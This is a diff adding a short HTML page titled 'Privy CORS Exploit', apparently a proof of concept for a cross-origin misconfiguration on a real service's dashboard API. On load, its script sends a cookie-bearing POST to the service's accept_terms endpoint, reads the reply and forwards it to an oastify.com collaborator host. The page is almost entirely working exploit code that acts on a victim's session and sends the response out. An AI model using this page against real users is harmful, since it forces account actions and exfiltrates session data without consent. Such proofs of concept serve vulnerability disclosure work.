@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Privy CORS Exploit</title>
+  </head>
+  <body>
+    <h2>Exploiting Privy CORS Misconfiguration...</h2>
+    <script>
+      fetch("https://dashboard.privy.io/api/v1/users/me/accept_terms", {
+        method: "POST",
+        credentials: "include", // يرسل الـ cookies مع الطلب
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: "{}"
+      })
+      .then(response => response.text())
+      .then(data => {
+        fetch("https://3x1u5wa0j4bso0zxrar58kl8fzlq9gx5.oastify.com", {
+          method: "POST",
+          mode: "no-cors",
+          body: data
+        });
+      });
+    </script>
+  </body>
+</html>
